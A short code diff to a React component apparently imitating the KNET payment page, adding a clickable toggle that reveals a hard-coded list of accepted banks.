@@ -146,6 +146,7 @@ export default function KNETPayment() {
   const [rejectedError, setRejectedError] = useState("");
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [errorModalMessage, setErrorModalMessage] = useState("");
+  const [showAcceptedCards, setShowAcceptedCards] = useState(false);
 
   // Get amount from localStorage
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
@@ -401,7 +402,34 @@ export default function KNETPayment() {
     <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
       {showViewCards && (
         <div style={{ marginBottom: 20 }}>
-          <span style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
+          <span onClick={() => setShowAcceptedCards(!showAcceptedCards)} style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
+          {showAcceptedCards && (
+            <ul style={{ fontSize: 13, color: "#333", lineHeight: 2, marginTop: 10, paddingLeft: isRtl ? 0 : 25, paddingRight: isRtl ? 25 : 0 }}>
+              <li>Kuwait Finance House B.S.C.(c).</li>
+              <li>Al Baraka Islamic Bank B.S.C</li>
+              <li>Al-Salam Bank - Bahrain B.S.C.</li>
+              <li>Arab Bank Plc</li>
+              <li>Bahrain Islamic Bank</li>
+              <li>BANK OF BAHRAIN AND KUWAIT</li>
+              <li>Citi Bank N. A.</li>
+              <li>CREDIT LIBANAIS S.A.L</li>
+              <li>Gulf International Bank B.S.C</li>
+              <li>Habib Bank Limited</li>
+              <li>HSBC Bank Middle East Limited</li>
+              <li>ICICI Bank Limited</li>
+              <li>ila Bank</li>
+              <li>Ithmaar Bank B.S.C. (Closed)</li>
+              <li>Khaleeji Commercial Bank B.S.C.</li>
+              <li>Mashreq Bank P.S.C</li>
+              <li>National Bank Of Bahrain B.S.C.</li>
+              <li>National Bank Of Kuwait S.A.K. / Commercial Branch</li>
+              <li>Payment international Enterprise BSC (closed)</li>
+              <li>Standard Chartered Bank</li>
+              <li>STATE BANK OF INDIA (FOREIGN BRANCH)</li>
+              <li>The Housing Bank For Trade And Finance - Jordan</li>
+              <li>United Bank Limited</li>
+            </ul>
+          )}
         </div>
       )}
       <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
